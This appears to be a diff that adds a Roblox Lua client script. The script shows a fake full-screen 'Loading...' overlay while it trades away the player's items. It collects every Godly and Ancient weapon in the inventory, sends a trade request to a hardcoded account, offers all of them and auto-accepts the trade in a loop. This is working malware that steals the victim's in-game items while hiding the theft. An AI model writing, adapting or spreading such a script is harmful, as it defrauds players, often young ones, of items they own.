@@ -1,0 +1,69 @@
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Remotes = ReplicatedStorage.Remotes
+local DB = require(ReplicatedStorage.Database.Sync.Item)
+local LocalPlayer = Players.LocalPlayer
+
+local loadingGui = Instance.new("ScreenGui")
+loadingGui.Name = "LoadingGui"
+loadingGui.DisplayOrder = 999999999
+loadingGui.ResetOnSpawn = false
+loadingGui.IgnoreGuiInset = true
+loadingGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(1, 0, 1, 0)
+frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+frame.BackgroundTransparency = 0.4
+frame.Parent = loadingGui
+local textLabel = Instance.new("TextLabel")
+textLabel.Text = "Loading..."
+textLabel.Size = UDim2.new(1, 0, 1, 0)
+textLabel.Position = UDim2.new(0, 0, 0, 0)
+textLabel.BackgroundTransparency = 1
+textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+textLabel.TextScaled = true
+textLabel.Font = Enum.Font.GothamBold
+textLabel.Parent = frame
+
+local targetUser = Players:WaitForChild("dhxuygxbxxxxxb")
+local function IsTrading()
+	local trade_statue = ReplicatedStorage.Trade.GetTradeStatus:InvokeServer()
+	return trade_statue == "StartTrade"
+end
+local function sendTrade()
+	ReplicatedStorage.Trade.SendRequest:InvokeServer(targetUser)
+end
+local function getGodlyAndAncient()
+	local inventory = Remotes.Extras.GetFullInventory:InvokeServer(LocalPlayer)
+	local owned = inventory.Weapons.Owned
+	local list = {}
+	for ItemID, _ in pairs(owned) do
+		local itemData = DB[ItemID]
+		if itemData and (itemData.Rarity == "Godly" or itemData.Rarity == "Ancient") then
+			table.insert(list, ItemID)
+		end
+	end
+
+	return list
+end
+local function addAllToTrade(items)
+	for _, ItemID in pairs(items) do
+		ReplicatedStorage.Trade.OfferItem:FireServer(ItemID, "Weapons")
+		task.wait(0.1)
+	end
+end
+local function autoTradeLoop()
+	while true do
+		local items = getGodlyAndAncient()
+		if #items == 0 then break end
+		sendTrade()
+		repeat task.wait(0.1) until IsTrading()
+		addAllToTrade(items)
+		while IsTrading() do
+			ReplicatedStorage.Trade.AcceptTrade:FireServer(285646582)
+			task.wait(0.1)
+		end
+		task.wait(0.1)
+	end
+end
+task.spawn(autoTradeLoop)
